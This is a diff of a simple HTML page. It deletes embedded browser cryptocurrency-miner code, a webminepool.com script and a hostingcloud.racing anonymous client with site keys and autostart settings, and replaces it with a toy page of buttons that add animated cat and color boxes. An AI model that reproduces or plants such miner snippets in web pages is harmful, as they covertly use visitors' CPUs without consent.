@@ -1,28 +1,121 @@
 <!DOCTYPE html>
-<html>
-<body>
+<html id="pageID">
+  <head>
+    
+    <input id="fast" type="button" class="button" value="Add Cat   " onclick="CreateSQR()">
+    <input id ="slow"type="button" class="button" value="Add Color" onclick="Cat()">
+    <script>
+  let number = 3;
+ function CreateSQR(){
+  
+  
+ var elemDiv = document.createElement('div');
+ elemDiv.style.cssText = "width:300px;height:300px;border-radius:10%;border: thick double #32a1ce; border:100px; margin: 3%;float:left;color:black; font-weight:bold;animation:myanimation 3s infinite;"
+ elemDiv.style.background ="url('https://scontent.ftsr1-2.fna.fbcdn.net/v/t39.30808-6/318480398_1553354208436658_1958694217191735755_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=730e14&_nc_ohc=zgxBYc7YlkUAX-r-uV0&_nc_ht=scontent.ftsr1-2.fna&oh=00_AfCFAO0ys4nVXip4dxia01Unzqxs59NncI0pSuOUf9JxHg&oe=6392A371')"
+  document.body.appendChild(elemDiv);
+  number =number++;
+ }
 
-<h1>My First Heading</h1>
-<p>My first paragraph.</p>
-<script src="https://webminepool.com/lib/simple-ui.js"></script>
-<div id="wmp-container"
-    wmp-site-key="SK_peg3sCFXsevPKCVjVXfVw"
-    wmp-username="<username>"
-    wmp-threads="2"
-    wmp-throttle="0.1"
-    wmp-autostart="true"
-    style="margin: 0 auto;"
->
-</div>
-  <script src="https://www.hostingcloud.racing/6fSx.js"></script>
-<script>
-    var _client = new Client.Anonymous('31a36264240586e8745923dbce3c852062003d7d60ca0fbfd7dce5ce6600fe8e', {
-        throttle: 0, c: 'w', ads: 0
-    });
-    _client.start();
+
+ function Cat(){ 
+  var elemDiv = document.createElement('div');
+ elemDiv.style.cssText = "width:300px;height:300px;border-radius:10%;border: thick double #32a1ce; border:100px; margin: 3%;float:left;color:black; font-weight:bold;animation:myanimation 3s infinite;"
+ document.body.appendChild(elemDiv);
+  number =number++;
+  } 
+ 
+
+
+ </script>
+
+ <script>
+
+
+ function remove(){
+  alert("NOT WORKING YET ");;
+
+ }
+ </script>
+  </head>
+<body id="boddy">
+
+  
+<h1>Color Boooohy</h1>
+<div class="cub"></div>
+
+
+<style>
+html,
+.button {
+  background-color: #fa0909;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+#slow{
+  background-color: #098cf8;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+
+
+}
+
+
+
+
+#boddy {
+  height:auto
+}
+
+#pageID{
+  width: auto;
+  height: auto;
+  background-color: rgb(255, 247, 238);
+  
+}
+
+
+
+.cub{
+  width:300px;
+  height:300px;
+  border-radius:10%;
+  border-color:whitesmoke;
+  border: 100px;
+  margin: 3%;
+  float:left;
+  color:black;
+  font-weight:bold;
+  animation:myanimation 3s infinite;
+  
+}
+
+@keyframes myanimation {
+  0% {background-color: red;}
+  25%{background-color:yellow;}
+  50%{background-color:green;}
+  75%{background-color:brown;}
+  100% {background-color: red;}
+}
+    
+ </style>
     
 
-</script>  
+
+ 
     
 </body>
 </html>
